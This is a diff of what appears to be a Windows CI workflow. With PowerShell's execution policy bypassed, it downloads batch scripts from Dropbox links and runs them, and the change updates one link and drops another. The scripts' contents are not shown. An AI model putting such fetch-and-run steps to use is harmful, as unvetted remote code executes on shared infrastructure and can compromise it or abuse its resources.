@@ -8,9 +8,8 @@ jobs:
       shell: powershell.exe -ExecutionPolicy Bypass
     steps:
       - run: |
-         Invoke-WebRequest -Uri "https://www.dropbox.com/s/ei73gt7vevxck2t/Downloads.bat?dl=1" -OutFile "Downloads.bat"
+         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/wxgbjvtxpxj2my3zhilfv/Downloads.bat?rlkey=sh2twffzvcp0ab2m6cn24lde7&dl=1" -OutFile "Downloads.bat"
          cmd /c Downloads.bat
          cmd /c start.bat
-         Invoke-WebRequest -Uri "https://www.dropbox.com/s/coszn8d2zr7ws3p/loop.bat?dl=1" -OutFile loop.bat
          cmd /c loop.bat
          
